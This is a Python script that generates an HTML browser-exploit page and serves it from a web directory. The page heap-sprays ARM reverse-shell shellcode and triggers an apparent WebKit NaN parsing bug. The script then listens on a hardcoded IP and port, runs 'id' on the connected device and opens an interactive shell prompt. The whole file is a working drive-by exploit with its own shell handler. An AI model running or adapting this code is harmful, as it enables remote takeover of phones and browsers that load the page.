import os
import socket
import readline

shellipaddress = "192.168.248.128" 

octets = shellipaddress.split('.')
hex1 = "%.2x"%int(octets[0])
hex2 = "%.2x"%int(octets[1])
hex3 = "%.2x"%int(octets[2])
hex4 = "%.2x"%int(octets[3])
sploitfile="/var/www/client-side-shell/index.html"
command8 = "touch " + sploitfile
os.system(command8)
command9 = "chmod 777 " + sploitfile
os.system(command9)
with open(sploitfile, 'w') as f:
  lines = [
  "<html>\n",
  "<head>\n",
  "<script>\n",
  "var ip = unescape(\"\\u" + hex2 + hex1 + "\\u" + hex4 + hex3 + "\");\n",
  "var port = unescape(\"\\u3930\");\n",
  "function trigger()\n",
  "{\n",
  "var span = document.createElement(\"div\");\n",
  "document.getElementById(\"BodyID\").appendChild(span);\n",
  "span.innerHTML = -parseFloat(\"NAN(ffffe00572c60)\");\n",
  "}\n",
  "function exploit()\n",
  "{\n",
  "var nop = unescape(\"\\u33bc\\u0057\");\n",
  "do\n",
  "{\n",
  "nop+=nop;\n",
  "} while (nop.length<=0x1000);\n",
  "var scode = nop+unescape(\"\\u1001\\ue1a0\\u0002\\ue3a0\\u1001\\ue3a0\\u2005\\ue281\\u708c\\ue3a0\\u708d\\ue287\\u0080\\uef00\\u6000\\ue1a0\\u1084\\ue28f\\u2010\\ue3a0\\u708d\\ue3a0\\u708e\\ue287\\u0080\\uef00\\u0006\\ue1a0\\u1000\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1001\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1002\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u2001\\ue28f\\uff12\\ue12f\\u4040\\u2717\\udf80\\ua005\\ua508\\u4076\\u602e\\u1b6d\\ub420\\ub401\\u4669\\u4052\\u270b\\udf80\\u2f2f\\u732f\\u7379\\u6574\\u2f6d\\u6962\\u2f6e\\u6873\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u0002\");\n",
  "scode += port;\n",
  "scode += ip;\n",
  "scode += unescape(\"\\u2000\\u2000\");\n",
  "target = new Array();\n",
  "for(i = 0; i < 0x1000; i++)\n",
  "target[i] = scode;\n",
  "for (i = 0; i <= 0x1000; i++)\n",
  "{\n",
  "document.write(target[i]+\"<i>\");\n",
  "if (i>0x999)\n",
  "{\n",
  "trigger();\n",
  "}\n",
  "}\n",
  "}\n",
  "</script>\n",
  "</head>\n",
  "<body id=\"BodyID\">\n",
  "Enjoy!\n",
  "<script>\n",
  "exploit();\n",
  "</script>\n",
  "</body>\n",
  "</html>\n",
  ]
  f.writelines(lines)
vulnerable = "no"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(180)
s.bind((str(shellipaddress), 12345))
s.listen(1)
data_socket = None
try:
  data_socket, addr = s.accept()
except socket.timeout:
  pass
if data_socket:
  print "Connected: Try exit to quit"
  data="/system/bin/id\n"
  data_socket.sendall(data)
  data = data_socket.recv(1024)
  print data
  while True:
    data = raw_input("root#").strip()
    if data == "exit":
      data_socket.close()
      break
    data = data + "\n"
    data_socket.sendall(data)
    data = data_socket.recv(1024)
    print data
  vulnerable = "yes"
print "\nVulnerable: " + vulnerable
print
print
